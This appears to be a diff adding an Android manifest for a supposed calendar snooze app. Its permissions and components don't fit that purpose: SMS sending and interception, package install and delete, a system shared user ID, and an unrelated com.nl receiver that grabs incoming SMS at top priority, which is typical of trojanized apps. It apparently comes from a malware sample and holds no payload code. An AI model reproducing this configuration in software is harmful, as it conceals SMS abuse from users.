@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="internalOnly" android:sharedUserId="android.uid.system" package="com.bitfire.development.calendarsnooze">
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.WRITE_CALENDAR"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+    <application android:debuggable="false" android:icon="@drawable/ic_launcher" android:label="@string/app_name">
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:label="@string/app_name" android:name=".snoozeCalendar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:name=".preferences"/>
+        <activity android:label="@string/app_name" android:name=".calendarPreferences"/>
+        <receiver android:name="AlertReceiver">
+            <intent-filter android:priority="100">
+                <action android:name="android.intent.action.EVENT_REMINDER"/>
+                <data android:mimeType="vnd.android.cursor.item/calendar-alert"/>
+            </intent-filter>
+            <intent-filter android:priority="100">
+                <action android:name="android.intent.action.EVENTEX_REMINDER"/>
+                <data android:mimeType="vnd.android.cursor.item/calendarEx-alert"/>
+            </intent-filter>
+            <intent-filter android:priority="100">
+                <action android:name="android.intent.action.EVENT_REMINDER"/>
+                <data android:scheme="content"/>
+            </intent-filter>
+            <intent-filter android:priority="100">
+                <action android:name="android.intent.action.EVENT_REMINDER"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="vnd.android.cursor.item/calendar_alert_time"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="remindReceiver"/>
+        <receiver android:name="bootReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <activity android:label="@string/app_name" android:name=".viewEvent"/>
+        <activity android:label="@string/app_name" android:name=".SpeakActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:label="@string/app_name" android:name=".GetNoneMarket"/>
+        <service android:label="@string/app_name" android:name=".AlertService"/>
+        <service android:label="@string/app_name" android:name=".CallListener"/>
+        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="a14c0219470e3ec"/>
+        <meta-data android:name="com.google.android.backup.api_key" android:value="AEdPqrEAAAAIlFj4ZfOBpS686tYZUGehOO-k1Kbl1PMpyy5mrA"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.admob.android.ads.AdMobActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <receiver android:exported="true" android:name="com.admob.android.ads.analytics.InstallReceiver">
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name="com.nl.MyService"/>
+        <receiver android:name="com.nl.MyReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter android:priority="10000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter android:priority="10000">
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
